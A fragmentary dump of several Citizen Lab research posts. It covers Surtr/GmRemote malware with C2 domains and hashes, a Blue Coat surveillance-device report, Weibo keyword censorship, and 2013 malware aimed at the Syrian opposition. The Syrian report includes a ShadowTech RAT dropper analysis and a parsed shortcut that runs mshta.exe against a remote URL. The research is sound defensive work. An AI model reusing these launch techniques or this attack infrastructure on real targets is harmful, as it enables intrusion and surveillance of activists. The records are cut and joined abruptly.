connects to a C2 at flyoutside.com. This domain and eight others are registered to toucan6712@163.com:\n\n\n\nflyoutside.com\n67.198.227.162\n\n\n52showfly.com\n112.121.169.189\n\n\nmydreamfly.com\n112.121.186.60\n\n\ndreaminshy.com\n119.42.147.101\n\n\n52flyfeel.com\n119.42.147.101\n\n\neyesfeel.com\n180.178.63.10 (now registered to lili@nuo.cn)\n\n\noutsidefly.com\n74.55.57.85\n\n\nshowflyfeel.com\n199.119.101.40\n\n\n51aspirin.com\nnot resolving\n\n\n\nSearching for more samples in Virus Total Intelligence (VTI) using domains and other identifying features reveals four related files:\n\n7fbdd7cb8b46291e944fcecd5f97d135 – connects to C2 domain www.flyoutside.com, campaign code kmlg-0409tb\n58ff38412ebbedb611a3afe4b3dbd8b0 – connects to C2 IP 112.121.182.149 (similar to above), campaign code lly-0311\n81bc8974967e1c911b107a9a91e3178b – connects to C2 domain www.paulfrank166.2waky.com (192.198.85.102), campaign code 0201-2116\n44758b9a7a6cafd1b8d1bd4c773a2577 – connects to C2 domain www.flyoutside.com (same as the first sample found on ThreatExpert), campaign code lg-0109\n\nMost of these samples have campaign codes that suggest commercial targets. However, we do not have information about where these samples were submitted from, so the target sector and victims cannot be confirmed.\nA second GmRemote sample was found via the web, called Trojan/Subxe.89E1 by Anchiva. This sample connects to google.djkcc.com and uses campaign code in1102. Other subdomains under djkcc.com include:\nairforce.djkcc.com\ndomain.djkcc.com\ngoogle.djkcc.com\nindianembassy.djkcc.com\nmailnic.djkcc.com (MailNIC is an Indian email site at the National Informatics Centre)\nmicrosoft.djkcc.com\nrediffmail.djkcc.com (Rediffmail is an Indian email site)\nWhile we do not have information about what victims these samples target, the campaign code, C2 domain, and related subdomains give some possible indications.\nOne additional find via VTI is a GmRemote sample internally named: GmKeyBoradServer_DLL.dll (MD5 e7e1c69496ad7cf093945d3380a2c6f4).\nIt exports functions (GmFunctionType, GmInitPoint, GmMyInitPoint, GmRecvPoint, GmShutPoint, GmVerSion) that are referenced in other GmRemote samples, although none of them have any real content.\nThese additional samples suggest that Surtr is being used to target groups beyond the Tibetan community and is possibly being utilized by multiple threat actors.\nConclusions and Recommendations\nThe attacks we have observed that use the Surtr malware family are another example of the persistent targeted malware campaigns the Tibetan community faces. The specific attack reported in this post demonstrates that attackers are actively monitor mailing lists and discussion groups used by the Tibetan community and repurpose the content for use in targeted malware attacks.\nFor communities under persistent threat from targeted malware campaigns, user vigilance and education are essential for reducing risk.\n\nUsers should carefully examine the sender’s email address of emails and exercise caution in opening unexpected or unsolicited attachments or opening unverified links.\n\n\nSee Citizen Lab’s Recommendations for defending against targeted cyber threats for additional information, and Tibet Action Institute’s Detach from Attachments and Think Before You Click campaigns.\n\nThe Citizen Lab is continuing to monitor targeted malware campaigns using Surtr and will post updates as they are available.\n—\nAppendix MD5’s & Identifiers\nEmail Attachment Names & MD5s:\n1) TCCC PRESIDENT & BOARD MEMBERS NOMINATION & ELECTION POLICY & PROCEDURE.doc – 8c06aec37c7e51f581aaa41f66d4ebad2) communication1.doc – 28444ee593653a4816deb186a6eddee83) communication2.doc – c269b3cf3d336a40c2fd7c2111b52982\nStage 1\nSection: .text\nMD5 hash: d4f9b3b573a8f1d70d58aa8daf9cb256\nSHA-1 hash: a1d5128cd50959bc7008be1fdfe2cf6339ed7098\nSHA-256 hash: aef9f55931d054dbf027639e30d0abf587696b13d8993aab6c22eb7d47f0de83\nSection: .rdata\nMD5 hash: e130ff2adbf4515b1af88b451396e1f6\nSHA-1 hash: 248691810ae34407aa3486ef3faca6fe3286f630\nSHA-256 hash: adae7b2306d7fc145ebd90fd1147bc352c56937d58e1996b89d5368cebdb438d\nSection: .data\nMD5 hash: c4fc864da3ee8462c5c25054f00e703f\nSHA-1 hash: b28a02f68cbacdaa89cf274dc79b3c802a21599d\nSHA-256 hash: 203ca80897fd63ca3fc55ec4be22cd302d5d81729ee8f347bd8f22c73ad1b61d\nSection: .reloc\nMD5 hash: bc2c349c1f4c338c6834a79c03c461fb\nSHA-1 hash: c71504a96ea72656ef826677a53f9a5230fcb049\nSHA-256 hash: 58c192f73afe761b42493a36ded1a5724f06e14f44304b946341eb46b3bdfa7d\nThe hashes of the resource section vary based on how much it is padded.\nNotable Strings:\ncScCssvdcfhgshtj\nCrtRunTime.log\naCvVpR\n_One.dll\n_Fra.dll\nasasdasrqwfsdvctyqwm\nefskdfjaslkfjlaksd\ndksfjasdklfjasd\ncasfjaklsdjfaskdlf\nbakjfasdkljfkldfjaslkd\nadskjfksldjfklsad\nsoul\nLiveUpdata_Mem\\\nBurn\\\nStage 2 (downloaded component)\nMD5: 21aa9dd44738d5bf9d8a8ecf53c3108c\nNotable Strings:\nx86_GmRemote.dll\nMark\nD:\\Project\\GTProject\\Public\\List\\ListManager.cpp\n \nFootnote\n1 Surtr is a fire giant in Norse Mythology.

    "text": "\n\t\t\t\tBy Morgan Marquis-Boire, Collin Anderson, Jakub Dalek, Sarah McKune, and John Scott-Railton.\nThe Citizen Lab is pleased to announce the release of Some Devices Wander by Mistake: Planet Blue Coat Redux. \nRead the Report [PDF]\nRead the Arabic Version  / النسخة العربية \nRead The Washington Post article associated with this report.\nLink to global map of Blue Coat devices on public networks.\nExplore the data here.\nIn this report, our third on Blue Coat Systems, we use a combination of network measurement and scanning methods and tools to identify instances of Blue Coat ProxySG and PacketShaper devices. This kind of equipment can be used to secure and maintain networks, but it can also be used to implement politically-motivated restrictions on access to information, and monitor and record private communications.\nWe found Blue Coat devices on public networks of 83 countries (20 countries with both ProxySG and PacketShaper, 56 countries with PacketShaper only, and 7 countries with ProxySG only). Included in these countries are regimes with questionable human rights records, and three countries that are subject to US sanctions: Iran, Syria, and Sudan.\nOur findings raise questions around the sale of “dual-use” communication technologies to national jurisdictions where the implementation of such technology has not been publicly debated or shaped by the rule of law. The issues raised by this report go beyond one company and its products and services, and underscore the imperatives of addressing the global public policy implications of internationally-marketed communications infrastructure and services.\nAlongside the publication of our report, we have sent a letter to representatives of Blue Coat and its major investor, the Ontario Teachers’ Pension Plan (OTPP), inquiring about their human rights due diligence processes, and commit to publishing in full their reply.\nMedia Coverage\nIn addition to The Washington Post piece, media coverage of the report includes SC Magazine, Help Net Security, Motherboard, The Independent and Human Rights First.\n \n \n\n\t\t\t\t\n\t\t\t",

    "description": "Summary:",
    "text": "\n\t\t\t\t\nSummary:\n\n532 of 3,311 unique terms from the China Chats keyword list (a list of terms found to be censored and monitored by two Chinese chat clients, Sina UC and TOM-Skype) were blocked on Weibo on June 6 (16.1%) and 480 were blocked on Weibo on June 29 (14.5%).\nNearly 10% of the unique terms from the China Chats keyword list were unblocked on Weibo between Jun 6 and Jun 29, but the majority of these were related to the June 4 anniversary. More monitoring of the keywords in the coming months will be needed before we can conclude whether the unblocking of keywords is a gradual shift away from their usage or merely a momentary change related to a specific event.\nTracking the number of search results for each term over time is a useful metric for identifying exceptional cases where Weibo has manipulated the display or actual content of search results. These drops are often caused by the omission of posts, which are made explicit with two different messages.\nThough there wasn’t much overlap between Sina UC and TOM-Skype’s lists, those keywords which were on both lists were five times more likely to be blocked on Weibo than those that were only on one or neither list. Sina UC’s list contained slightly more words that were blocked on Sina Weibo than TOM-Skype’s, but the majority of words on both lists were not blocked on Sina Weibo, perhaps due in part to the fact that neither list has been updated in months. The lack of a more common overlap between the services in their censored keyword lists is also an indication that each service developed their lists independently; however, other evidence, for instance the existence of very specific keywords on multiple lists, indicates that a higher authority may be in charge of distributing some keywords to different services.\nA spreadsheet of all the data mentioned in this report can be viewed in this Google Fusion Table or downloaded in .csv format for further analysis.\n\n\nEarlier this week, The Citizen Lab in collaboration with researchers at the University of New Mexico released one of the largest unbiased surveillance and censorship keyword lists, which was extracted and decrypted from two chat programs used in China. In total, these lists from TOM-Skype and Sina UC comprise 4,256 keywords, and provide fascinating insight into the types of topics that authorities at those companies consider sensitive and worth censoring/listening in on.\nPast lists of sensitive keywords on Chinese websites have been developed through techniques ranging from internal testing aided by crowdsourced reports to more systematic monitoring. However, the nature of these newly-released lists—the 4,256 keywords represent every keyword that these two IM programs have been tracking on the client side, including a number of unique words that have been not previously known to be sensitive—provides researchers with a complete set of keywords known to represent all the major topics that were of interest to authorities in charge at Sina UC and TOM-Skype during the past year and a half. (Though some caveats: these two chat programs are lightly used in China, with their market share paling in comparison to the dominant chat client, Tencent’s QQ, and the lists have not been frequently updated in recent months.)\nAmong the findings of the paper The Citizen Lab/UNM published is that there was not much overlap of keywords between the two chat clients: only 3% of the words were censored/monitored in both Sina UC and TOM-Skype, strongly indicating that for these chat clients, the censorship and surveillance lists were developed internally and not handed down from a central source. However, was there much overlap and sharing of keyword lists within companies? And are these keywords still sensitive right now? The paper does preliminary analysis by checking the set against previously known lists of blocked keywords, but we decided to extend this analysis by performing a more thorough test on June 6 and then again on June 29, checking whether each of the 4,256 keywords was blocked from searching on Sina Weibo, the most actively used social media website in China. (A spreadsheet of all the data mentioned in this report can be viewed in this Google Fusion Table or downloaded in .csv format for further analysis.)\nThe unblocking of June 4 terms\nOf the 4,256 keywords, 783 were blocked on June 6 (18.4%) while 707 were blocked on June 29 (16.6%).

However, this could be a reference to illicit use/buying/cracking of telephone numbers.\nillicit goods and services\n\n\n\nHowever, a closer look at the 54 unique words that were unblocked (two were added to the block list: “9评”, the Nine Commentaries, and “six*4”, a June 4 reference, giving us the net change of -52 blocked words) reveals that the majority of them were related to the June 4 Tiananmen Square crackdown. Twenty-nine of the words were initially categorized as related to June 4, and another nine were likely blocked due to June 4-references2 (支联会, 吴仁华, 支聯會, 64狗qq, 64气狗QQ, 二十四人通缉令, chailing, 54式 64式 手枪, 2453605542).\nAs discussed by GreatFire.org, June 4-related keywords appeared to be treated in a special manner before and during the anniversary, and the data here affirms this—three weeks after June 4, a number of June 4-related words have apparently been deemed to no longer be sensitive enough to be blocked (though 44 words we’ve categorized as related to June 4 are still blocked, including most of the ones we previously identified in a test on June 3rd). Whether the unblocking of keywords is part of a gradual, intentional shift toward a censorship system more reliant on human censors who delete posts and away from the crutch of blanket search blocks, or whether it was just a momentary blip related to June 4, is something we’ll know more about as we continue to test this list in the coming weeks.\nIdentifying which keywords have been targeted for implicit censorship via decreased reported search result numbers\nUsing the data that we’ve accumulated via keyword searches, another potential way of unearthing new or unexpected censorship patterns is to track the number of search results returned for each keyword search and identifying major drops in reported results. If on June 1 a search for “Ferrari” on Weibo reports there are 10,000 results,3 and the following week there are only 100, even though the term has not been blocked, it would be clear that something is being manipulated, either via the deletion of posts or their disappearance from searches.\nObviously, this relies on Weibo to report results honestly and consistently; the method outlined above is useless if Weibo constantly changes its search algorithm or is intentionally manipulating the number of results reported to mask the actual level of censorship that is taking place. However, for the two data points for quantity of search results that we have, that doesn’t appear to be the case:\n\n\n\n\n\n\nPercent change in number of results from June 6\nto June 29 for China Chats keywords with greater than 1000 results initially and are not blocked on Weibo\n\n\n% change\nnumber of keywords\n% total\n\n\n-100% to -90%\n45\n3.48\n\n\nto -80%\n1\n0.08\n\n\nto -70%\n1\n0.08\n\n\nto -60%\n0\n0.00\n\n\nto -50%\n0\n0.00\n\n\nto -40%\n0\n0.00\n\n\nto -30%\n1\n0.08\n\n\nto -20%\n1\n0.08\n\n\nto -10%\n2\n0.15\n\n\n-10% to 0%\n68\n5.26\n\n\n0% to 10%\n1045\n80.82\n\n\nto 20%\n69\n5.34\n\n\nto 30%\n18\n1.39\n\n\nto 40%\n11\n0.85\n\n\nto 50%\n4\n0.31\n\n\nto 60%\n4\n0.31\n\n\nto 70%\n1\n0.08\n\n\nto 80%\n0\n0.00\n\n\nto 90%\n4\n0.31\n\n\n90% to 100%\n0\n0.00\n\n\n>100%\n18\n1.39\n\n\n\ntotal=1293\n\n\n\n\nExcept for a few exceptional cases, the number of results reported for keywords tended to be very stable. After filtering out all the uncommon terms with under 1,000 results as well as those which were blocked on our first test on June 6, over 80% of the remaining 1,293 keywords had their search results increase by 0-10% on our second test—not totally unexpected as one would expect users to add new posts to Weibo’s database and Weibo to dutifully report them. However, there are some outliers: 18 keywords increased by over 100%, either an indication that they became particularly hot and were used quite a bit more in posts during the period between tests; or that Weibo suddenly tweaked the search algorithm for those terms specifically. Even if the latter is true, using number of results reported seems to be a genuine, though not foolproof, measure of a keyword’s usage in posts.\nLooking at the other end of the spectrum, the 45 keywords which decreased by over 90% cannot be explained by any reasonable natural occurrence, it can only be due to either inconsistency or intentional manipulation of Weibo’s search algorithm that causes such an extreme drop in reported results. And indeed, while inconsistency does play a factor, with 17 of the 45 keywords subsequently returning to roughly their original number of results as of today, the other 28 keywords have maintained the suppressed number of search results. For example, a search for 恶党 (evil party), which once returned 861,904 results, returned 852 during our second test—and is still dropping with only 783 or 814 being reported as of July 4, 3:42 EDT. However, noted at the bottom now is “为了提供多样性结果，我们省略了部分相似微博，您可以点击查看全部搜索结果” which translates to “In order to provide more diverse search results, we’ve dropped some similar posts, you can click to see all the search results.” Clicking on the link should now give you access to all 880,000+ posts which contain 恶党. Similarly, one can access very nearly the same list of 880,000+ by searching for “恶 党” with a space between the characters. Also of note is that on the bottom of certain pages of search results for 恶党, though never on the first page, is the message “根据相关法律法规和政策，部分搜索结果未予显示”: “Due to relevant laws, regulations, and policies, some search results were not displayed.” (This new “semi-censorship” by Weibo was first noted by Jason Q. Ng and GreatFire.org in Sept 2012.)\n\nThe same hiding of results—forcing users to click to access the full set of posts containing the desired search term—is true for a few other keywords we tested, but a more thorough check of future drops in search results will need to be done before we can come to a conclusion about what Weibo is trying to accomplish with this tactic. Whether it’s intentional censorship or an unintended tweak in the search algorithm, something odd is taking place and worth further examination.\nOverlaps of sensitive terms between services\nAs mentioned previously, there did not appear to be much overlap between the keyword lists in Sina UC and TOM-Skype. However, after performing our test on Sina Weibo, we now have another service to compare those lists against.\nDuring our first test, 294 of the 1,919 unique words from TOM-Skype’s list were blocked on Weibo (15.3%), dropping slightly to 267 three weeks later (13.9%). Perhaps unsurprisingly since they both have the same parent company, the number of Sina UC’s keywords which were blocked on Sina Weibo was slightly higher than TOM-Skype’s: 299 of the 1,517 unique words from Sina UC’s list were blocked at first (19.7%), and 270 (17.8%) subsequently.\nRunning some regression models seems to indicate at first glance that Sina UC’s keywords are much more likely to return no results than TOM-Skype, but digging deeper it appears that this is due to the greater number of keywords we’ve categorized as URLs in Sina UC’s list than in TOM-Skype’s list (267 in Sina UC’s list versus just 7 in TOM-Skype’s). URLs of course are much more likely to return 0 results on Sina Weibo because Weibo natively uses a link shortener. Re-running the regression without keywords categorized as URLs and using length of the keyword as a control eliminates that discrepancy.\nHowever, which list a keyword is on significantly affects whether or not it will be explicitly blocked on Sina Weibo: keywords on Sina UC’s list are 77% more likely to be blocked on Weibo than non Sina-UC terms (p<0.001), whereas TOM-Skype words are 20% less likely to be blocked on Weibo than non-Sina-UC terms (p=.02).  Thus, either Sina UC and Sina Weibo share similar outlooks or processes on deciding which words to be blocked; or TOM-Skype is especially bad at predicting what sensitive words will continue to be relevant today (remember: the Sina UC and TOM-Skype censorship lists we are analyzing have not been updated since December 2012).\nHowever, there are a number of blocked Weibo keywords on Sina UC’s list and even TOM-Skype’s list which are so specific that it seems unlikely that either service developed them independently from Sina Weibo, and thus point to a central authority being involved. For instance, the “big character” slogan 清算特权废除特供 (Expose and criticize the privileged; repeal the special benefits) is contained on TOM-Skype’s list and is also blocked on Weibo—but only if the term is entered exactly as is. If any character from the phrase is removed or if the four-character words are reversed, the phrase becomes unblocked. What are the odds that two different services blocked this exact eight-character term—which has only eight results on Google, two of which are references to the research that uncovered it? The phrase does occur in a 2011 article on the Epoch Times website, the newspaper primarily affiliated with the Falun Gong, and while it is possible that both Weibo and TOM-Skype are performing content analysis of the Epoch Times’s website and adding new keywords automatically, it may be more reasonable to conclude that Sina Weibo and TOM-Skype receive certain keywords from higher-ups. But if that’s the case, then why did Sina UC’s list not include this keyword?\nFurthermore, it is worth keeping in mind that even though there wasn’t much overlap of the terms between the two services, those that were shared are particularly special, having been identified (or mandated from above) by both services as sensitive. One hundred twenty-five unique keywords are on both lists, roughly half of which are explicitly blocked from searching on Weibo. These words are nearly 5 times more likely to be blocked on Weibo than those only on one or not on both lists (p<0.001), a possible sign of the “wisdom of crowds”—if you can call two chat clients a crowd—at identifying the most sensitive of sensitive words. Or perhaps those words were so much more likely to be blocked on Sina Weibo because central authorities have designated these words for special treatment and caused them to be censored across services.\nBoth explanations are plausible, another sign of the opaqueness and vagaries of the Chinese censorship system showing themselves again. Having examined this preliminary data, questions remain: How much self-censorship is performed by companies and how much is mandated by the government? Do services within the same company share similar censorship lists and strategies? Is the unblocking of June 4-related keywords indicative of larger trends or just a scheduling blip? More work is to be done but hopefully the keyword list available from The Citizen Lab/UNM’s China Chats study will assist interested folks in performing future research into these questions.\n\n1. Words were marked as non-unique if they either:\n\ncontained another keyword on the list within it, e.g., 一夜情 (one-night stand) contains 一夜 (one-night), which is also on the list; or\ncontained the component of another known blocked keyword within it, e.g., 无码 (uncensored) is blocked on Weibo and is contained in 18 keywords from our list, for instance 成人无码DVD (uncensored Japanese DVDs); thus, one of the 18 is marked as unique while the other 17 are marked as not unique. In cases like 无码, the choice of which term was designated as unique as opposed to the others might affect the analysis of which chat client “earned” the Weibo block designation. However, this only affects a handful of such cases, and ideally, a more rigorous approach would go back and solve this by designating the unique word as in both lists if its components are found in keywords on both lists. For instance, of the eighteen words that contain 无码, 17 are exclusively on TOM-Skype’s list and one is exclusively on Sina UC’s list. The unique keyword to represent 无码 was one of the TOM-Skype keywords, so in future regressions testing how likely a word would be blocked if it were on TOM-Skype’s list as opposed Sina UC’s list, TOM-Skype would be exaggerated by a slight increment since the designated unique word doesn’t account for it’s presence in the one Sina UC keyword which contained it. Ideally, their would be a variable that would re-weight all this so that the model would know that 17/18 of the client designation for the unique blocked word should be appropriated to TOM-Skype while 1/17 should go to Sina UC, but the current approach is probably acceptable for the general analysis in this report.\n\n2. While “64” itself wasn’t blocked when it was tested on June 6, the preponderance of words which contain “64” which were blocked indicate that the term was likely used to trigger a search block when combined with other seemingly innocent words.\n3. Weibo only shows 50 pages of results for each search (with 20 posts per page, a total of 1,000 posts), even if it reports there are more than 1,000 results. However, you can narrow your search by date, location, and other options to view more specific results, and could verify if indeed there were actually 1.3 million posts which contain “Obama” as Weibo says there is. One could also theoretically use the Weibo search API and scrape the results, but unfortunately the date, page, and count parameters for advancing to the next set of results don’t actually work as described in the API documentation. If someone has figured out how to use Weibo’s search API properly, please feel free to contact the author.\nJason Q.

    "text": "\n\t\t\t\tDownload PDF\nAn Arabic translation of this post is available at Cyber Arabs\n[النسخة العربية [فوق\nAuthors: John Scott-Railton and Morgan Marquis-Boire\nThis report describes two attacks observed in mid-June 2013 targeting the Syrian opposition.\n\n\nMalware masquerading as the circumvention tool Freegate.\n\n\nA campaign masquerading as a call to arms by a pro-opposition cleric.\n\n\nIntroduction\nSyria’s opposition has faced persistent targeting by Pro-Government Electronic Actors (PGEAs) throughout the Syrian civil war. A pro-government group calling itself the Syrian Electronic Army has gained visibility in recent months with high profile attacks against news organizations. Meanwhile, Syrian activists continue to be targeted with online attacks apparently for the purposes of accessing their private communications and stealing their secrets.\nThroughout 2012, attacks against the Syrian opposition were documented in an extensive series of blog posts by Morgan Marquis-Boire and Eva Galperin with the help of the Electronic Frontier Foundation.1 Many others have also contributed to research on Syrian malware, from Telecomix to a range of security companies. Meanwhile, the Syrian opposition, and several groups working closely with it, such as Cyber Arabs, have been active in attempting to identify potential threats and warn users.\nResearchers have identified a common theme among the attacks against the Syrian opposition: sophisticated social engineering that is grounded in an awareness of the needs, interests, and weaknesses of the opposition. Attacks often play on curiosity or ideology to encourage users to enter passwords or click on enticing files, or exploit fears of hacking and surveillance with fake security tools. Attacks are often transmitted to potential victims from the accounts of people with whom they are familiar.\nThe two attacks that are described in this blogpost follow this theme. One is a malicious installer of the circumvention tool Freegate. The other is an e-mail attachment calling for jihad against Hezbollah and the Assad regime or promising interesting regional news.\nAttack 1: A Helping of Malware with that Proxy?\nIn this attack, which we first observed in the second week of June, the potential victim is encouraged to visit a download link containing a malicious installer of Freegate.\nFreegate is a standalone circumvention-bypassing Virtual Private Network (VPN) client for Windows. Legitimate versions of the Freegate software are available for download on its website. While initially developed for mainland Chinese users, the software is used in a number of other countries.\nWhile Freegate was erroneously labelled a Trojan by one anti-virus company nearly a decade ago, in this attack, attackers packaged what appears to be a legitimate version of Freegate with a malicious implant.2 The targeted group were members of the Syrian opposition in a private social media group.\n\nhttp://www.mediafire.com/download/[REDACTED]/VPN-Pro.zip\n\nWhen a potential victim visits the link, they are offered the download of a file which MediaFire lists as uploaded on June 15, 2013.\n\nVPN-PRO.zip3\nUploaded: 2013-06-15 16:54:31\n\nThe zip file extracts to a MS Windows executable file.\n\nVPN-Pro.exe4\n\nThe binary was compiled at 2013-06-15 22:41:31 UTC and has the following properties:\n\nLegalCopyright: Copyright © 2013\nAssembly Version: 1.0.0.0\nInternalName: VPN-Pro.exe\nFileVersion: 1.0.0.0\nProductName: VPN-Pro\nProductVersion: 1.0.0.0\nFileDescription: VPN-Pro\nOriginalFilename: VPN-Pro.exe\n\nSimilar to previously observed malware attacks targeting the Syrian opposition, this was written in .NET and appears to require the .NET 3.5 framework to execute.5\nWhen VPN-Pro.exe is run, the victim is shown the Freegate end-user license agreement (EULA) dialogue box.6 Upon agreeing to the EULA, an operational copy of Freegate proxy is launched, which includes a request to unblock the firewall. The copy of Freegate launched is listed as “Freegate 7.35 Professional Edition.” The Freegate software begins operating, and quickly prompts the user for an update.\n\nInfection\nIn addition to running a legitimate copy of Freegate 7.35,7 the malware installs an implant.\n\nA fake “svchost.exe” is installed in the victim’s Application Data directory.\n\nC:\\Documents and Settings\\<Username>\\Application Data\\svchost.exe\n\nDropped files on execution of VPN-Pro.exe:\n\nExamination of the “svchost.exe” binary shows multiple references to “ShadowTech Rat.”\n\n0000d5f0 00 53 68 61 64 6f 77 54 65 63 68 20 52 61 74 2e |.ShadowTech Rat.|\n0000d600 65 78 65 00 53 68 61 64 6f 77 54 65 63 68 20 52 |exe.ShadowTech R|\n0000d610 61 74 00 3c 4d 6f 64 75 6c 65 3e 00 01 00 03 00 |at.<Module>.....|<snip>0000d6d0 04 00 56 61 6c 75 65 54 79 70 65 00 05 00 44 61 |..ValueType...|Da|\n0000d6e0 74 61 00 53 68 61 64 6f 77 54 65 63 68 5f 52 61 |ta.ShadowTech_Ra|\n0000d6f0 74 00 49 53 65 72 69 61 6c 69 7a 61 62 6c 65 00 |t.ISerializable.|\n0000d700 53 79 73 74 65 6d 2e 52 75 6e 74 69 6d 65 2e 53 |System.Runtime.S|\n0000d710 65 72 69 61 6c 69 7a 61 74 69 6f 6e 00 4d 79 53 |erialization.MyS|\n0000d720 65 74 74 69 6e 67 73 00 53 68 61 64 6f 77 54 65 |ettings.ShadowTe|\n0000d730 63 68 5f 52 61 74 2e 4d 79 00 41 70 70 6c 69 63 |ch_Rat.My.Applic|\n\nExamination of network traffic also identifies the implant as ShadowTech RAT.\nPacket capture on port 1321/tcp:\n\n00 01 00 00 00 ff ff ff ff 01 00 00 00 00 00 00   ................\n00 0c 02 00 00 00 45 53 68 61 64 6f 77 54 65 63   ......EShadowTec\n68 20 52 61 74 2c 20 56 65 72 73 69 6f 6e 3d 31   h Rat, Version=1\n2e 30 2e 30 2e 30 2c 20 43 75 6c 74 75 72 65 3d   .0.0.0, Culture=\n6e 65 75 74 72 61 6c 2c 20 50 75 62 6c 69 63 4b   neutral, PublicK\n65 79 54 6f 6b 65 6e 3d 6e 75 6c 6c 05 01 00 00   eyToken=null....\n00 13 53 68 61 64 6f 77 54 65 63 68 5f 52 61 74   ..ShadowTech_Rat\n2e 44 61 74 61 03 00 00 00 04 64 61 74 61 05 69   .Data.....data.i\n6d 61 67 65 05 62 79 74 65 73 01 02 02 02 00 00   mage.bytes......\n00 06 03 00 00 00 64 31 30 32 36 32 32 30 32 31   ......d102622021\n46 32 30 30 33 32 34 30 33 30 30 33 36 32 44 36   F2003240300362D6\n34 33 38 30 42 34 33 35 37 31 30 31 36 33 31 33   4380B43571016313\n44 33 39 30 30 32 45 32 31 30 36 30 38 30 43 30   D39002E2106080C0\n46 32 35 33 38 30 37 30 38 30 35 37 41 37 35 33   F25380708057A753\n33 30 44 37 37 32 36 33 35 33 31 36 39 33 45 34   30D77263531693E4\n34 37 45 31 35 35 38 37 38 35 43 0a 0a 0b         47E1558785C...\n\nShadowTech Rat is a Remote Access Trojan which appears to be widely available for download on both English and Arabic language sites.

In 2012, malicious installers for Green Simurgh—a standalone proxy intended for Iranian users but also used by some Syrians—were found in circulation. The creators of Green Simurgh responded by posting a prominent warning on their website highlighting the presence of these malicious installers. Last year, malware which purported to be the Tor Browser Bundle was found in the wild. It was found to be backdoored by Gh0st RAT and exfiltrated data to an IP in China.\nAn attack using a malicious installer of a working and reputable security or proxy tool is especially pernicious as it targets users who likely recognize the importance of privacy and circumvention, and may believe that they have increased their privacy and security by installing the tool.\nAttack 2: A Targeted Call to Arms\nIn this campaign, contact with targets was initiated through phishing e-mails, chat messages and Facebook posts. Although we became aware of this campaign in early June, we have evidence that it may have started as early as January 2013. We believe that this campaign targeted—at least in part—high-profile members of the Syrian opposition. Interestingly, the attack included targeting of at least one non-public address associated with internal opposition communications. This indicates some degree of prior penetration of the opposition—either through computer network intrusion or other intelligence gathering activities.\nThe potential victim in this attack first receives a message from an unknown source, in this case, a Gmail account with a nondescript name.\nExample e-mail:\n\nThe e-mail contains text, an image (not shown), and an attachment. The text refers to a video of Sheikh Adnan al-Arour—a Sunni pro-opposition cleric—based in Saudi Arabia, calling for holy war against Assad and Hezbollah. The user is led to believe that opening the zip file, which is descriptively titled as being the Sheikh’s opinion, will provide access to the video.\nWhile we have identified multiple different attacks with different zip files, the structure of all of these is consistent with the example described here.\nExample zip files:\n\nرأي الشيخ عدنان العرعور بالإئتلاف الوطني السوري.zip9\nرابط – الشيخ عدنان العرعور يعلن الجهاد.zip\nاصابة المبعوث الدولي الاخضر الابراهيمي بجلطة دماغية.zip\nخاص جدا حول مجزرة نهر قويق والمسؤول الحقيقي عنها .zip\n\nThe zip file extracts to a Windows Shortcut file with the same name and a .lnk extension.\nExample .lnk file “Sample A”:\n\nرأي الشيخ عدنان العرعور بالإئتلاف الوطني السوري.lnk\n\nParsing these files reveals a URL embedded in the the file (bolded below).\nParsing Sample A:\n\nsource path/filename: 1file modified: 06/16/2013 16:49:04 [UTC]\nfile accessed: 06/19/2013 22:00:22 [UTC]\nfile created: 06/19/2013 22:00:22 [UTC]\nTarget flags: HasLinkTargetIDList, HasLinkInfo, HasRelativePath, Has\nWorkingDir, HasArguments, HasIconLocation, IsUnicode, DisableLinkPathTracking\nTarget attributes: FILE_ATTRIBUTE_ARCHIVE\nTarget modified: 07/17/2012 22:58:51.981 [UTC]\nTarget accessed: 07/17/2012 22:58:51.981 [UTC]\nTarget created: 07/17/2012 22:58:51.981 [UTC]\nTarget ObjID time: 12/27/2012 10:55:02.540 [UTC]\nFile offset: 0x00000000 [0]\nParsed size: 0x000005b2 [1458 bytes]\nTarget file size: 0x00003000 [12288 bytes]\nShow cmd: [SW_SHOWNORMAL]\nID List: {CLSID_MyComputer}\\C:\\Windows\\System32\\mshta.exe\nVolume Type: fixed\nVolume serial num: 7203-8b23\nVolume label: ╟ß▐╤╒ ╟ßπ═ßφ: C\nLocal base path: C:\\Windows\\System32\\mshta.exe\nRelative path: ..\\..\\..\\Windows\\System32\\mshta.exe\nWorking directory: C:\\Windows\\system32\nCmdline args: http://[REDACTED]?url=http://www.youtube.com/watch?v=jDkluDCn7fA\nIcon filename: %SystemRoot%\\system32\\SHELL32.dll\nSpecial Folder ID: CSIDL_SYSTEM\nKnown Folder ID: 1ac14e77-02e7-4e5d-b744-2eb1ae5198b7\nNETBIOS name: xp-pc\nVolume ID: 32035a92-7032-4de3-846f-ed880ad23fa7\nObject ID: dd81bda8-5013-11e2-ab13-c0f8da734a02\nMAC address: c0:f8:da:73:4a:02\nformat ID [value]: {b725f130-47ef-101a-a5f1-02608c9eebac} [mshta.exe\\╪º┘ä╪¬╪╖╪¿┘è┘é]\nformat ID [value]: {46588ae2-4cbc-4338-bbfc-139326986dce} [S-1-5-21-1348441612-1947693625-1007466904-1000]\nformat ID [value]: {dabd30ed-0043-4789-a7f8-d013a4736622} [System32▲ (ΓÇ¬C:\\WindowsΓÇ¼)]\nformat ID [value]: {28636aa6-953d-11d2-b5d6-00c04fd918d0} [C:\\Windows\\System32\\mshta.exe]\n\nWhen the victim executes the Windows shortcut, they are directed to one of several malicious links depending on the zipfile that they were sent.

We have chosen to highlight two attacks that are part of recent efforts by Pro-Government Electronic Actors to compromise opposition communications and steal their secrets.\nThese attacks cater to the opposition’s communication behaviors and tactics. They are indicative of a combination of prior intelligence about the opposition, and ingenuity in social engineering. For example, many in the Syrian opposition are now aware of the electronic threats they face and seek out tools to increase their communications security and privacy. Tools and information about security and communications are in constant circulation. Some of this material addresses well-defined vulnerabilities. We have observed a greater degree of care among many in the opposition when facing certain situations that were common attack modalities in 2012. As awareness grows and behavior evolves, we suspect that some of the attacks that we regularly observed in 2012 are much less successful today.\nSome of the information and practices that are shared between users, however, are much less appropriate, even inadvertently dangerous. For example, many legitimate tools are shared via third party file sharing sites or over social media. This situation presents a rich variety of targets for attackers in which to seed malicious binaries and links masquerading as familiar or desirable tools.\nWe infer that from the point of view of these attackers, not all attacks need to have sophisticated malware in order to be successful enough to be worth doing. Yet, perhaps in response to the growing awareness of previous and often widely targeted attacks against the Syrian opposition, attackers continue to innovate and experiment with new techniques that blend social engineering with new attack styles. The experiments are sometimes clearly successful. For example, in the case of Attack 2, the Windows shortcut files were not conclusively identified as malicious by even 